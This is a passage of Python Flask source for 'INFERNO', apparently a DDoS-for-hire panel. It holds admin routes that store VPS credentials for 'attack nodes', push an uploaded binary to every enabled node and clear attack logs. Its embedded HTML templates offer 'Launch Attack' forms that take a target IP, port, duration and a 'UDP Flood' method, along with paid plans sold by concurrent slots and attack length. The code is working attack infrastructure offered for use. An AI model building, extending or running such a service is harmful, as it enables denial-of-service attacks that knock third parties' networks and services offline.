            os.makedirs(key_dir, exist_ok=True)
            ext = os.path.splitext(file.filename)[1]
            safe_name = f"vps_{int(time.time())}_{random.randint(1000,9999)}{ext}"
            key_path = os.path.join(key_dir, safe_name)
            file.save(key_path)
            os.chmod(key_path, 0o600)
    if USE_MONGO:
        node = {
            "name": name,
            "node_type": "vps",
            "enabled": enabled,
            "vps_host": host,
            "vps_port": port,
            "vps_username": username,
            "vps_password": password,
            "vps_key_path": key_path,
            "last_status": "unknown",
            "binary_present": False,
            "created_at": datetime.utcnow()
        }
        attack_nodes_col.insert_one(node)
    else:
        node = AttackNode(name=name, node_type='vps', enabled=enabled, vps_host=host, vps_port=port, vps_username=username, vps_password=password, vps_key_path=key_path)
        db_sql.session.add(node)
        db_sql.session.commit()
    flash('VPS node added', 'success')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/nodes/<node_id>/check', methods=['POST'])
@admin_required
def admin_check_node(node_id):
    if USE_MONGO:
        node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
    else:
        node = AttackNode.query.get(node_id)
    if node:
        if node['node_type'] == 'github':
            ok, msg = test_github_node(node)
        else:
            ok, msg = test_vps_node(node)
        if ok:
            flash(f'Node {node["name"]} is online: {msg}', 'success')
        else:
            flash(f'Node {node["name"]} is offline: {msg}', 'danger')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/nodes/<node_id>/toggle', methods=['POST'])
@admin_required
def admin_toggle_node(node_id):
    if USE_MONGO:
        node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
        if node:
            new_enabled = not node['enabled']
            attack_nodes_col.update_one({"_id": ObjectId(node_id)}, {"$set": {"enabled": new_enabled}})
            flash(f'Node {node["name"]} toggled', 'success')
    else:
        node = AttackNode.query.get(node_id)
        if node:
            node.enabled = not node.enabled
            db_sql.session.commit()
            flash(f'Node {node.name} toggled', 'success')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/nodes/<node_id>/delete', methods=['POST'])
@admin_required
def admin_delete_node(node_id):
    if USE_MONGO:
        node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
        if node:
            if node.get('vps_key_path') and os.path.exists(node['vps_key_path']):
                try:
                    os.remove(node['vps_key_path'])
                except:
                    pass
            attack_nodes_col.delete_one({"_id": ObjectId(node_id)})
            flash('Node deleted', 'success')
    else:
        node = AttackNode.query.get(node_id)
        if node:
            if node.vps_key_path and os.path.exists(node.vps_key_path):
                try:
                    os.remove(node.vps_key_path)
                except:
                    pass
            db_sql.session.delete(node)
            db_sql.session.commit()
            flash('Node deleted', 'success')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/upload_binary', methods=['POST'])
@admin_required
def admin_upload_binary():
    if 'binary' not in request.files:
        flash('No file selected', 'danger')
        return redirect(url_for('admin_nodes'))
    file = request.files['binary']
    if file.filename == '':
        flash('No file selected', 'danger')
        return redirect(url_for('admin_nodes'))
    binary_data = file.read()
    if USE_MONGO:
        nodes = list(attack_nodes_col.find({"enabled": True}))
    else:
        nodes = AttackNode.query.filter_by(enabled=True).all()
    success_count = 0
    for node in nodes:
        if node['node_type'] == 'github':
            if distribute_binary_to_github(node, binary_data):
                success_count += 1
        else:
            if distribute_binary_to_vps(node, binary_data):
                success_count += 1
    flash(f'Binary distributed to {success_count}/{len(nodes)} nodes', 'success')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/settings', methods=['GET', 'POST'])
@admin_required
def admin_settings():
    if request.method == 'POST':
        new_admin_pass = request.form.get('new_admin_password')
        if new_admin_pass and len(new_admin_pass) >= 6:
            if USE_MONGO:
                admin_users_col.update_one({"username": "admin"}, {"$set": {"password_hash": generate_password_hash(new_admin_pass)}})
            else:
                admin = AdminUser.query.filter_by(username='admin').first()
                if admin:
                    admin.password_hash = generate_password_hash(new_admin_pass)
                    db_sql.session.commit()
            flash('Admin password changed', 'success')
        else:
            flash('Password must be at least 6 characters', 'danger')
        if request.form.get('clear_users'):
            if USE_MONGO:
                users_col.delete_many({})
            else:
                User.query.delete()
                db_sql.session.commit()
            flash('All users cleared', 'success')
        if request.form.get('clear_api_keys'):
            if USE_MONGO:
                api_keys_col.delete_many({})
            else:
                ApiKey.query.delete()
                db_sql.session.commit()
            flash('All API keys cleared', 'success')
        if request.form.get('clear_attack_logs'):
            if USE_MONGO:
                attack_logs_col.delete_many({})
            else:
                AttackLog.query.delete()
                db_sql.session.commit()
            flash('All attack logs cleared', 'success')
        if request.form.get('clear_nodes'):
            if USE_MONGO:
                attack_nodes_col.delete_many({})
            else:
                AttackNode.query.delete()
                db_sql.session.commit()
            flash('All attack nodes cleared', 'success')
        return redirect(url_for('admin_settings'))
    if USE_MONGO:
        stats = {
            'users': users_col.count_documents({}),
            'api_keys': api_keys_col.count_documents({}),
            'attack_logs': attack_logs_col.count_documents({}),
            'nodes': attack_nodes_col.count_documents({})
        }
    else:
        stats = {
            'users': User.query.count(),
            'api_keys': ApiKey.query.count(),
            'attack_logs': AttackLog.query.count(),
            'nodes': AttackNode.query.count()
        }
    return render_template_string(ADMIN_SETTINGS_HTML, stats=stats)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# ---------- Luxury UI Templates (embedded) ----------
LOGIN_HTML = '''
<!DOCTYPE html>
<html><head><title>Login • INFERNO</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
<style>
:root{--bg:#07080a;--surface:#11141b;--accent:#ffb400;--text:#e6edf3;--dim:#8b949e;--border:rgba(255,180,0,0.15);}
*{margin:0;padding:0;box-sizing:border-box;}
body{background:radial-gradient(circle at 20% 30%, #07080a, #000); font-family:'Plus Jakarta Sans',sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px;}
.glass-card{background:rgba(17,20,27,0.8); backdrop-filter:blur(12px); border-radius:32px; border:1px solid var(--border); padding:40px; width:100%; max-width:450px;}
input{background:rgba(0,0,0,0.5); border:1px solid #2a3a5a; border-radius:40px; padding:12px 20px; color:white; width:100%; margin-bottom:20px;}
input:focus{outline:none; border-color:var(--accent); box-shadow:0 0 12px rgba(255,180,0,0.3);}
.btn-gold{background:linear-gradient(90deg,#ffb400,#ff8c00); border:none; border-radius:40px; padding:12px; font-weight:800; width:100%; cursor:pointer;}
a{color:var(--accent); text-decoration:none;}
</style></head>
<body><div class="glass-card"><h2 class="text-center mb-4" style="color:var(--accent);">🔐 INFERNO</h2>
{% with messages = get_flashed_messages(with_categories=true) %}{% for cat, msg in messages %}<div class="alert alert-{{ cat }}">{{ msg }}</div>{% endfor %}{% endwith %}
<form method="POST">
    <input type="text" name="token" placeholder="Access Token" required>
    <div><label style="color:var(--accent);">Captcha: {{ captcha_question }}</label><input type="text" name="captcha" placeholder="Your answer" required></div>
    <button type="submit" class="btn-gold">🚀 Login</button>
</form>
<p class="text-center mt-3">No token? <a href="/register">Generate one</a></p><hr><p class="text-center mt-3"><small>Admin? <a href="/admin/login">Admin Login</a></small></p></div></body></html>
'''

REGISTER_HTML = '''
<!DOCTYPE html>
<html><head><title>Register • INFERNO</title><meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{background:radial-gradient(circle at 20% 30%, #07080a, #000); font-family:'Plus Jakarta Sans',sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px;}
.glass-card{background:rgba(17,20,27,0.8); backdrop-filter:blur(12px); border-radius:32px; border:1px solid rgba(255,180,0,0.15); padding:40px; width:100%; max-width:450px;}
.btn-gold{background:linear-gradient(90deg,#ffb400,#ff8c00); border:none; border-radius:40px; padding:12px; font-weight:800; width:100%; cursor:pointer;}
input{background:rgba(0,0,0,0.5); border:1px solid #2a3a5a; border-radius:40px; padding:12px 20px; color:white; width:100%; margin-bottom:20px;}
</style></head>
<body><div class="glass-card"><h2 style="color:#ffb400;">✨ Create Account</h2>
{% with messages = get_flashed_messages(with_categories=true) %}{% for cat, msg in messages %}<div class="alert alert-{{ cat }}">{{ msg }}</div>{% endfor %}{% endwith %}
<form method="POST"><div><label style="color:#ffb400;">Captcha: {{ captcha_question }}</label><input type="text" name="captcha" required></div>
<button type="submit" class="btn-gold">🎫 Generate Token</button></form>
<p class="text-center mt-3">Already have one? <a href="/login" style="color:#ffb400;">Login</a></p></div></body></html>
'''

DASHBOARD_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>INFERNO | Command Center</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg: #07080a;
            --surface: #11141b;
            --accent: #ffb400;
            --accent-glow: rgba(255, 180, 0, 0.3);
            --text-primary: #ffffff;
            --text-secondary: #8b949e;
            --border: rgba(255, 255, 255, 0.05);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
        body { background: var(--bg); color: var(--text-primary); display: flex; height: 100vh; overflow: hidden; }
        .sidebar { width: 280px; background: var(--surface); border-right: 1px solid var(--border); display: flex; flex-direction: column; transition: all 0.3s; z-index: 100; }
        .brand-section { padding: 30px; text-align: center; border-bottom: 1px solid var(--border); }
        .brand-logo { font-weight: 800; font-size: 1.4rem; letter-spacing: 4px; color: var(--accent); text-shadow: 0 0 15px var(--accent-glow); }
        .nav-list { flex: 1; padding: 20px; list-style: none; }
        .nav-item { padding: 14px 18px; margin-bottom: 8px; border-radius: 12px; cursor: pointer; color: var(--text-secondary); display: flex; align-items: center; gap: 12px; transition: all 0.3s; font-weight: 600; }
        .nav-item:hover, .nav-item.active { background: rgba(255, 180, 0, 0.08); color: var(--accent); }
        .main-container { flex: 1; display: flex; flex-direction: column; overflow-y: auto; padding: 40px; background: radial-gradient(circle at top right, #161b22, var(--bg)); }
        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; }
        .user-badge { background: var(--surface); padding: 8px 16px; border-radius: 50px; border: 1px solid var(--border); display: flex; align-items: center; gap: 10px; }
        .status-dot { width: 8px; height: 8px; background: #00ff88; border-radius: 50%; box-shadow: 0 0 10px #00ff88; }
        .grid-layout { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px; }
        .glass-card { background: rgba(17, 20, 27, 0.6); backdrop-filter: blur(10px); border: 1px solid var(--border); border-radius: 20px; padding: 30px; transition: all 0.3s; }
        .glass-card:hover { border-color: var(--accent-glow); transform: translateY(-5px); }
        .card-header { font-size: 0.8rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 15px; display: flex; justify-content: space-between; }
        .big-stat { font-size: 2.5rem; font-weight: 800; margin-bottom: 10px; background: linear-gradient(135deg, #fff, var(--accent)); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .progress-track { width: 100%; height: 6px; background: #1c2128; border-radius: 10px; margin: 20px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--accent), #ff8c00); box-shadow: 0 0 15px var(--accent-glow); width: 0%; transition: width 1.5s ease; }
        .action-button { width: 100%; padding: 15px; background: var(--accent); color: #000; border: none; border-radius: 12px; font-weight: 800; text-transform: uppercase; cursor: pointer; transition: all 0.3s; }
        .action-button:hover { box-shadow: 0 0 25px var(--accent-glow); filter: brightness(1.1); }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th { text-align: left; color: var(--text-secondary); font-size: 0.8rem; padding: 10px; }
        td { padding: 15px 10px; border-top: 1px solid var(--border); font-weight: 500; }
        .status-online { color: #00ff88; }
        @media (max-width: 768px) { .sidebar { display: none; } .main-container { padding: 20px; } .menu-toggle { display: block; } }
        .menu-toggle { display: none; position: fixed; top: 20px; left: 20px; z-index: 200; background: var(--accent); border: none; padding: 10px 15px; border-radius: 30px; color: #000; cursor: pointer; }
        .form-control { width:100%; padding:12px; background:#1f2937; border:1px solid #374151; border-radius:40px; color:white; margin-bottom:12px; }
    </style>
</head>
<body>
    <button class="menu-toggle" id="menuToggle"><i class="fas fa-bars"></i></button>
    <aside class="sidebar" id="sidebar">
        <div class="brand-section"><div class="brand-logo">INFERNO</div></div>
        <ul class="nav-list">
            <li class="nav-item active"><i class="fas fa-tachometer-alt"></i> Dashboard</li>
            <li class="nav-item" onclick="window.location.href='/attack'"><i class="fas fa-bolt"></i> Attack Hub</li>
            <li class="nav-item" onclick="window.location.href='/products'"><i class="fas fa-shopping-cart"></i> Products</li>
            <li class="nav-item" onclick="window.location.href='/logout'"><i class="fas fa-sign-out-alt"></i> Logout</li>
        </ul>
        <div style="padding:20px;"><div class="user-badge"><div class="status-dot"></div><span>{{ user.plan }}</span></div></div>
    </aside>
    <main class="main-container">
        <div class="top-bar"><div><h1 style="font-weight:800;">Command Center</h1><p style="color:var(--text-secondary);">Welcome back, {{ user.username }}.</p></div></div>
        <div class="grid-layout">
            <div class="glass-card">
                <div class="card-header"><span>Free Network</span><span style="color:var(--accent);">{{ slots_used }}/{{ max_slots }} Slots Used</span></div>
                <div class="big-stat">{{ (slots_used/max_slots*100)|round(0) if max_slots>0 else 0 }}%</div>
                <div class="progress-track"><div class="progress-fill" id="loadBar" style="width: {{ (slots_used/max_slots*100) if max_slots>0 else 0 }}%;"></div></div>
                <p style="font-size:0.85rem; color:var(--text-secondary);">Upgrade for 10x Power</p>
                <a href="/products"><button class="action-button" style="margin-top:15px;">⚡ Upgrade Now</button></a>
            </div>
            <div class="glass-card">
                <div class="card-header"><span>Quick Attack</span></div>
                <form id="attackForm">
                    <input type="text" name="host" placeholder="Target IP" class="form-control" required>
                    <input type="number" name="port" placeholder="Port" class="form-control" required>
                    <input type="number" name="time" placeholder="Duration (sec)" value="60" class="form-control" required>
                    <select name="method" class="form-control"><option value="UDP">UDP Flood 🔥🔥🔥🔥🔥</option></select>
                    <button type="submit" class="action-button">💥 Launch Attack</button>
                </form>
                <div id="attackResult" style="margin-top:15px;"></div>
            </div>
        </div>
        <div class="glass-card" style="margin-top:30px;">
            <div class="card-header">Recent Attacks</div>
            <div class="table-responsive"><table><thead><tr><th>Target</th><th>Port</th><th>Duration</th><th>Method</th><th>Status</th><th>Time</th></tr></thead><tbody>{% for a in attacks %}<tr><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.duration }}s</td><td>{{ a.method }}</td><td><span class="status-online">{{ a.status }}</span></td><td>{{ a.timestamp.strftime('%H:%M:%S') }}</td></tr>{% else %}<tr><td colspan="6" style="text-align:center;">No attacks yet</td></tr>{% endfor %}</tbody></table></div>
        </div>
    </main>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        document.getElementById('menuToggle')?.addEventListener('click', () => {
            let s = document.getElementById('sidebar');
            s.style.display = s.style.display === 'none' ? 'flex' : 'none';
        });
        $('#attackForm').submit(function(e){
            e.preventDefault();
            $.post('/launch', $(this).serialize(), function(data){
                if(data.status === 'success') {
                    $('#attackResult').html('<div style="color:#00ff88;">'+data.message+'</div>');
                    setTimeout(() => location.reload(), 2000);
                } else {
                    $('#attackResult').html('<div style="color:#ff5555;">'+data.message+'</div>');
                }
            });
        });
    </script>
</body></html>
'''

ATTACK_HTML = '''
<!DOCTYPE html>
<html><head><title>Attack Hub • INFERNO</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
<style>body{background:radial-gradient(circle at 10% 20%, #07080a, #000); font-family:'Plus Jakarta Sans',sans-serif; color:#fff; padding:20px;}
.glass-card{background:rgba(17,20,27,0.45);backdrop-filter:blur(12px);border-radius:32px;border:1px solid rgba(255,180,0,0.15);padding:28px;margin-bottom:30px;}
.btn-gold{background:linear-gradient(90deg,#ffb400,#ff8c00);border:none;border-radius:60px;padding:12px 24px;font-weight:800;color:#000;}
input,select{background:rgba(0,0,0,0.5); border:1px solid #2a3a5a; border-radius:40px; padding:12px 20px; color:white; width:100%;}
</style>
</head>
<body><div class="container py-4"><div class="glass-card"><h2 class="mb-3"><i class="fas fa-bolt me-2" style="color:#ffb400;"></i> Launch Attack</h2>
<form method="POST"><div class="mb-3"><label>Target IP Address</label><input type="text" name="target" required></div>
<div class="mb-3"><label>Port</label><input type="number" name="port" required></div>
<div class="mb-3"><label>Duration (seconds) – Max {{ user.max_duration }}s</label><input type="number" name="duration" value="60" min="1" max="{{ user.max_duration }}" required></div>
<div class="mb-3"><label>Attack Method</label><select name="method"><option value="UDP">UDP Flood 🔥🔥🔥🔥🔥</option></select></div>
<div class="mb-3"><label>Concurrent (Max {{ user.max_concurrent }})</label><input type="range" name="concurrent" class="form-range" min="1" max="{{ user.max_concurrent }}" value="1" oninput="this.nextElementSibling.value=this.value"><output>1</output></div>
<button type="submit" class="btn-gold w-100">💥 Launch Attack</button></form>
{% with messages = get_flashed_messages(with_categories=true) %}{% for cat, msg in messages %}<div class="alert alert-{{ cat }} mt-3">{{ msg }}</div>{% endfor %}{% endwith %}</div>
<a href="/dashboard" class="btn btn-link text-info">← Back to Dashboard</a></div>
<script>document.querySelector('input[name="concurrent"]').addEventListener('input',function(e){this.nextElementSibling.value=this.value;});</script>
</body></html>
'''

PRODUCTS_HTML = '''
<!DOCTYPE html>
<html><head><title>Products • INFERNO</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
<style>body{background:radial-gradient(circle at 10% 20%, #07080a, #000); font-family:'Plus Jakarta Sans',sans-serif; color:#fff; padding:20px;}
.glass-card{background:rgba(17,20,27,0.45);backdrop-filter:blur(12px);border-radius:32px;border:1px solid rgba(255,180,0,0.15);padding:28px;margin-bottom:30px;}
.btn-gold{background:linear-gradient(90deg,#ffb400,#ff8c00);border:none;border-radius:60px;padding:12px 24px;font-weight:800;color:#000;}
.pricing-card{text-align:center;}.price{font-size:36px; font-weight:800; color:#ffb400;}
</style>
</head>
<body><div class="container py-4"><div class="d-flex justify-content-between align-items-center mb-4"><h2 style="color:#ffb400;">🚀 Upgrade Your Plan</h2><a href="/dashboard" class="btn btn-link text-info">← Back</a></div>
<div class="row g-4">{% for plan in plans %}<div class="col-md-3"><div class="glass-card pricing-card"><h3>{{ plan.name }}</h3><div class="price">{{ plan.price }}</div>
<div class="mt-3"><p><i class="fas fa-layer-group"></i> {{ plan.concurrent }} Concurrent Slots</p><p><i class="fas fa-hourglass-half"></i> {{ plan.duration }}s Max Duration</p>
<p><i class="fas fa-bolt"></i> {{ plan.methods }}</p><p><i class="fas fa-server"></i> {{ plan.slots }} Attack Slots</p></div>
<button class="btn-gold mt-3" onclick="alert('Contact admin to upgrade')">Contact Sales</button></div></div>{% endfor %}</div></div>
</body></html>
'''

ADMIN_LOGIN_HTML = '''
<!DOCTYPE html>
<html><head><title>Admin Login • INFERNO</title><meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{background:radial-gradient(circle at 10% 20%, #07080a, #000); font-family:'Plus Jakarta Sans',sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px;}
.glass-card{background:rgba(17,20,27,0.8); backdrop-filter:blur(12px); border-radius:32px; border:1px solid rgba(255,180,0,0.2); padding:40px; width:100%; max-width:450px;}
input{background:rgba(0,0,0,0.5); border:1px solid #2a3a5a; border-radius:40px; padding:12px 20px; color:white; width:100%; margin-bottom:20px;}
.btn-admin{background:linear-gradient(90deg,#ffb400,#ff8c00); border:none; border-radius:40px; padding:12px; font-weight:800; width:100%;}
</style>
</head>
<body><div class="glass-card"><h2 class="text-center mb-4" style="color:#ffb400;">👑 Admin Login</h2>
{% with messages = get_flashed_messages(with_categories=true) %}{% for cat, msg in messages %}<div class="alert alert-{{ cat }}">{{ msg }}</div>{% endfor %}{% endwith %}
<form method="POST"><input type="text" name="username" placeholder="Admin Username" required><input type="password" name="password" placeholder="Admin Password" required><button type="submit" class="btn-admin">🔐 Login as Admin</button></form>
<p class="text-center mt-3"><a href="/login">← User Login</a></p></div></body></html>
'''

ADMIN_DASHBOARD_HTML = '''
<!DOCTYPE html>
<html><head><title>Admin Dashboard • INFERNO</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
<style>body{background:radial-gradient(circle at 10% 20%, #07080a, #000); font-family:'Plus Jakarta Sans',sans-serif; color:#fff;}
.sidebar{position:fixed;left:0;top:0;width:260px;height:100%;background:rgba(5,10,20,0.95);border-right:1px solid rgba(255,180,0,0.2);padding:30px 20px;z-index:10;}
.main{margin-left:260px;padding:30px;}
.glass-card{background:rgba(17,20,27,0.45);backdrop-filter:blur(12px);border-radius:24px;border:1px solid rgba(255,180,0,0.15);padding:20px;margin-bottom:25px;}
.stat-number{font-size:32px;font-weight:800;background:linear-gradient(135deg,#fff,#ffb400);-webkit-background-clip:text;background-clip:text;color:transparent;}
.nav-link{display:block;padding:12px 20px;margin:8px 0;border-radius:40px;color:#8b949e;text-decoration:none;}
.nav-link:hover,.nav-link.active{background:rgba(255,180,0,0.15);color:#ffb400;}
.menu-toggle{display:none;position:fixed;top:20px;left:20px;z-index:20;background:#ffb400;border:none;padding:10px 15px;border-radius:30px;color:#000;cursor:pointer;}
@media (max-width:800px){.sidebar{transform:translateX(-100%);}.main{margin-left:0;padding:70px 20px 20px;}.menu-toggle{display:block;}}
</style>
</head>
<body><button class="menu-toggle" id="menuToggle"><i class="fas fa-bars"></i></button>
<div class="sidebar" id="sidebar"><h3 style="color:#ffb400;">👑 Admin Panel</h3>
<nav><a href="/admin/dashboard" class="nav-link active"> Dashboard</a><a href="/admin/attack" class="nav-link"> Launch Attack</a><a href="/admin/users" class="nav-link"> Users</a><a href="/admin/attacks" class="nav-link"> Attack Logs</a><a href="/admin/api_keys" class="nav-link"> API Keys</a><a href="/admin/nodes" class="nav-link"> Attack Nodes</a><a href="/admin/settings" class="nav-link"> Settings</a><a href="/admin/logout" class="nav-link"> Logout</a></nav></div>
<div class="main"><h2>Admin Dashboard</h2><div class="row g-4 mb-4">
<div class="col-md-3"><div class="glass-card text-center"><div class="stat-number">{{ total_users }}</div><div>Total Users</div></div></div>
<div class="col-md-3"><div class="glass-card text-center"><div class="stat-number">{{ total_attacks }}</div><div>Total Attacks</div></div></div>
<div class="col-md-3"><div class="glass-card text-center"><div class="stat-number">{{ total_nodes }}</div><div>Total Nodes</div></div></div>
<div class="col-md-3"><div class="glass-card text-center"><div class="stat-number">{{ active_nodes }}</div><div>Active Nodes</div></div></div></div>
<div class="glass-card"><h4>Recent Attacks</h4><div class="table-responsive"><table class="table table-dark">...</table></div></div></div>
<script>document.getElementById('menuToggle').addEventListener('click',()=>document.getElementById('sidebar').classList.toggle('open'));</script>
</body></html>
'''

ADMIN_ATTACK_HTML = '''
<!DOCTYPE html>
<html><head><title>Admin Attack • INFERNO</title><meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{background:radial-gradient(circle at 10% 20%, #07080a, #000); font-family:'Plus Jakarta Sans',sans-serif; color:#fff; padding:20px;}
.glass-card{background:rgba(17,20,27,0.45);backdrop-filter:blur(12px);border-radius:32px;border:1px solid rgba(255,180,0,0.15);padding:28px;margin-bottom:30px;}
.btn-admin{background:linear-gradient(90deg,#ffb400,#ff8c00);border:none;border-radius:60px;padding:12px 24px;font-weight:800;color:#000;}
input,select{background:rgba(0,0,0,0.5); border:1px solid #2a3a5a; border-radius:40px; padding:12px 20px; color:white; width:100%;}
</style>
</head>
<body><div class="container py-4"><div class="glass-card"><h2 class="mb-3"><i class="fas fa-bolt me-2" style="color:#ffb400;"></i> Admin Attack Launcher</h2>
<form method="POST"><div class="mb-3"><label>Target IP Address</label><input type="text" name="target" required></div>
<div class="mb-3"><label>Port</label><input type="number" name="port" required></div>
<div class="mb-3"><label>Duration (seconds)</label><input type="number" name="duration" value="60" min="1" max="3600" required></div>
<div class="mb-3"><label>Attack Method</label><select name="method"><option value="UDP">UDP Flood</option></select></div>
<div class="mb-3"><label>Concurrent Slots (1-100)</label><input type="range" name="concurrent" class="form-range" min="1" max="100" value="1" oninput="this.nextElementSibling.value=this.value"><output>1</output></div>
<button type="submit" class="btn-admin w-100">🔥 Launch Admin Attack</button></form></div>
<a href="/admin/dashboard" class="btn btn-link text-info">← Back</a></div>
<script>document.querySelector('input[name="concurrent"]').addEventListener('input',function(e){this.nextElementSibling.value=this.value;});</script>
</body></html>
'''

ADMIN_USERS_HTML = '''
<!DOCTYPE html>
<html><head><title>Admin Users • INFERNO</title><meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{background:#07080a; color:#fff; padding:20px;}
.glass-card{background:rgba(17,20,27,0.45);border-radius:24px;padding:20px;}
table{width:100%;border-collapse:collapse;}
th,td{padding:12px;border-bottom:1px solid #2a3a5a;}
th{color:#ffb400;}
</style>
</head>
<body><div class="container"><div class="glass-card"><h2>User Management</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
<div class="table-responsive"><table class="table"><thead><tr><th>ID</th><th>Token</th><th>Plan</th><th>Max Concurrent</th><th>Max Duration</th><th>Total Attacks</th><th>Created</th><th>Actions</th></tr></thead><tbody>{% for u in users %}<tr><td>{{ u.id }}</td><td><code>{{ u.token[:24] }}...</code></td><td>{{ u.plan }}</td><td><form method="POST" action="/admin/users/{{ u.id }}/edit" style="display:inline"><input type="number" name="max_concurrent" value="{{ u.max_concurrent }}" style="width:70px"><button type="submit" name="action" value="set_limit" class="btn btn-sm btn-primary">Set</button></form></td><td>{{ u.max_duration }}s</td><td>{{ u.total_attacks }}</td><td>{{ u.created_at.strftime('%Y-%m-%d') }}</td><td><form method="POST" action="/admin/users/{{ u.id }}/edit" style="display:inline"><button type="submit" name="action" value="reset_token" class="btn btn-sm btn-warning">Reset</button></form><form method="POST" action="/admin/users/{{ u.id }}/edit" style="display:inline" onsubmit="return confirm('Delete user?')"><button type="submit" name="action" value="delete" class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></div></body></html>
'''

ADMIN_ATTACKS_HTML = '''
<!DOCTYPE html>
<html><head><title>Admin Attacks • INFERNO</title><meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{background:#07080a; color:#fff; padding:20px;}
.glass-card{background:rgba(17,20,27,0.45);border-radius:24px;padding:20px;}
table{width:100%;border-collapse:collapse;}
th,td{padding:12px;border-bottom:1px solid #2a3a5a;}
th{color:#ffb400;}
</style>
</head>
<body><div class="container"><div class="glass-card"><h2>Attack Logs</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
<div class="table-responsive"><table class="table"><thead><tr><th>ID</th><th>User ID</th><th>Target</th><th>Port</th><th>Method</th><th>Duration</th><th>Concurrent</th><th>Status</th><th>Time</th></tr></thead><tbody>{% for a in attacks %}<tr><td>{{ a.id }}</td><td>{{ a.user_id }}</td><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.method }}</td><td>{{ a.duration }}s</td><td>{{ a.concurrent }}</td><td>{{ a.status }}</td><td>{{ a.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</td></tr>{% endfor %}</tbody></table></div></div></div></body></html>
'''

ADMIN_API_KEYS_HTML = '''
<!DOCTYPE html>
<html><head><title>Admin API Keys • INFERNO</title><meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{background:#07080a; color:#fff; padding:20px;}
.glass-card{background:rgba(17,20,27,0.45);border-radius:24px;padding:20px;margin-bottom:20px;}
table{width:100%;border-collapse:collapse;}
th,td{padding:12px;border-bottom:1px solid #2a3a5a;}
</style>
</head>
<body><div class="container"><div class="glass-card"><h2>API Keys</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
<div class="card bg-dark mb-4"><div class="card-header">Create API Key</div><div class="card-body"><form method="POST" action="/admin/api_keys/create" class="row g-2"><select name="user_id" class="col-md-3"><option value="">Select User</option>{% for uid, uname in users.items() %}<option value="{{ uid }}">{{ uname }}</option>{% endfor %}</select><input type="text" name="name" placeholder="Key name" class="col-md-2"><input type="text" name="whitelist_ips" placeholder="Whitelist IPs" class="col-md-3"><input type="number" name="expires_days" placeholder="Expiry days" class="col-md-2"><button type="submit" class="btn btn-primary col-md-2">Create Key</button></form></div></div>
<div class="table-responsive"><table class="table"><thead><tr><th>ID</th><th>User</th><th>Name</th><th>Key</th><th>Whitelist</th><th>Expires</th><th>Created</th><th>Actions</th></tr></thead><tbody>{% for k in keys %}<tr><td>{{ k.id }}</td><td>{{ users[k.user_id] }}</td><td>{{ k.name }}</td><td><code>{{ k.key[:20] }}...</code></td><td>{{ k.whitelist_ips }}</td><td>{{ k.expires_at.strftime('%Y-%m-%d') if k.expires_at else 'Never' }}</td><td>{{ k.created_at.strftime('%Y-%m-%d') }}</td><td><form method="POST" action="/admin/api_keys/{{ k.id }}/delete" style="display:inline"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></div></body></html>
'''

ADMIN_NODES_HTML = '''
<!DOCTYPE html>
<html><head><title>Admin Nodes • INFERNO</title><meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{background:#07080a; color:#fff; padding:20px;}
.glass-card{background:rgba(17,20,27,0.45);border-radius:24px;padding:20px;margin-bottom:20px;}
.status-online{color:#00ff88;}.status-offline{color:#ff6680;}
table{width:100%;border-collapse:collapse;}
th,td{padding:12px;border-bottom:1px solid #2a3a5a;}
</style>
</head>
